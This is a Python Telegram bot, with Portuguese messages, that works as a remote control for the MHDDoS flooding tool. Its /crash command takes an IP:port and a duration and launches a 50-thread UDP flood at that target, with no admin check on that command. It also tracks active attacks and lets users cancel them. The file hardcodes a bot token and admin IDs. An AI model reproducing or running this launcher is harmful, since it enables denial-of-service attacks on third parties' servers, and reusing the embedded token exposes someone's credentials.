import subprocess
import os
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from datetime import datetime, timedelta
import pytz

SCRIPT_PATH = "/workspaces/MHDDoS/start.py"

ADMIN_IDS = ["7102594750", "7886388083"]

active_attacks = {}

def is_admin(user_id):
    return str(user_id) in ADMIN_IDS

def get_local_time():
    tz = pytz.timezone('America/Sao_Paulo')
    local_time = datetime.now(tz)
    return local_time

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 Você não tem permissão 🚫")
        return
    await update.message.reply_text('🔰 Bot iniciado')

async def crash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 2:
            await update.message.reply_text('incorreto Use: /crash 98.98.13.222:10015 900')
            return
        
        target = context.args[0]
        time = int(context.args[1])
        method = "UDP"
        threads = "50"

        start_time = get_local_time()
        start_time_str = start_time.strftime("%H:%M")
        
        end_time = start_time + timedelta(seconds=time)
        end_time_str = end_time.strftime("%H:%M")

        command = ['python3', SCRIPT_PATH, method, target, threads, str(time)]
        process = subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        active_attacks[target] = {
            "process": process,
            "user_id": update.message.from_user.id,
            "start_time": start_time_str,
            "end_time": end_time_str
        }

        # Botão de cancelamento
        keyboard = [[InlineKeyboardButton("🚫 Cancelar Ataque", callback_data=f"cancel_{target}")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        message = f"""
*✨ **Ataque Iniciado!** ✨*

🧑‍💻 **Usuário:** *{update.message.from_user.first_name}*
🌍 **IP:** `{target}`
🕰 **Tempo de Ataque:** `{time}s`
⏱ **Iniciado em:** *{start_time_str}*
⏰ **Término Estimado:** *{end_time_str}*
        """
        
        await update.message.reply_text(
            message,
            parse_mode="Markdown",
            reply_markup=reply_markup
        )

    except Exception as e:
        await update.message.reply_text(f'Erro ao tentar iniciar o ataque: {str(e)}')

async def cancel_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    target = query.data.split("_")[1]

    if target in active_attacks:
        attack_info = active_attacks[target]
        user_id = attack_info["user_id"]

        if user_id == query.from_user.id:
            process = attack_info["process"]
            process.terminate()
            del active_attacks[target]
            await query.edit_message_text(f'🚫 Ataque ao {target} foi cancelado.')
        else:

            return
    else:

        return

async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.message.from_user.id):
        await update.message.reply_text("🚫 Você não tem permissão 🚫")
        return
    
    await update.message.reply_text('♻️ Reiniciando...')

    os.system(f"pkill -f {SCRIPT_PATH}")

    os.execv(sys.executable, ['python3'] + sys.argv)

def main():
    TOKEN = "7561973559:AAEDtWNQwJm-VnoKXDUFdkmnn5wOmsXmHYI"
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("crash", crash))
    app.add_handler(CommandHandler("restart", restart))
    app.add_handler(CallbackQueryHandler(cancel_attack))

    print("Bot iniciado com sucesso!")
    app.run_polling()

if __name__ == "__main__":
    main()
